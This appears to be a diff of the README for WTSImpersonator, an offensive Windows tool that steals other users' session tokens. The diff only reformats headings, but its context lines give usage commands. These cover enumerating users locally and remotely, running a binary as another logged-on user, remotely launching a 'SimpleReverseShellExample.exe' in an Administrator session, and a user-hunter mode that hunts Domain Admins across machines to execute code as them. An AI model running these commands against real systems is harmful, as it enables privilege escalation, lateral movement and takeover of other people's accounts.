@@ -8,7 +8,7 @@ WTSImpersonator utilizes WTSQueryUserToken to steal other users tokens \(Local/R
 
 ## Usage: 
  
-##### `enum` Module  
+#### `enum` Module:  
   
 Enumerate Local Users on the machine the tool is running from  
 ```powershell
@@ -18,7 +18,7 @@ Enumerate a machine remotely given an IP or an Hostname.
 ```powershell  
 .\WTSImpersonator.exe -m enum -s 192.168.40.131  
 ```
-##### `exec` / `exec-remote` Module  
+#### `exec` / `exec-remote` Module:  
 Both "exec" and "exec-remote" requires being in a **"Service"** context.  
 The local "exec" module does not need anything buy the WTSImpersonator.exe and the binary you want to execute \(-c flag\), this could be  
 a normal "C:\Windows\System32\cmd.exe" and you will open a CMD as the user you desire, an example would be  
@@ -55,7 +55,7 @@ as can be seen above the `Sessionid` of the Administrator account is `2` so we u
 ```powershell
 PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```  
-##### `user-hunter` Module  
+#### `user-hunter` Module:  
 
 The user hunter module will give you the ability to enumerate multiple machines and if a given user is found, it will execute code on this user behalf.  
 this is useful when hunting for "Domain Admins" while having local administrator rights on a few machines.  
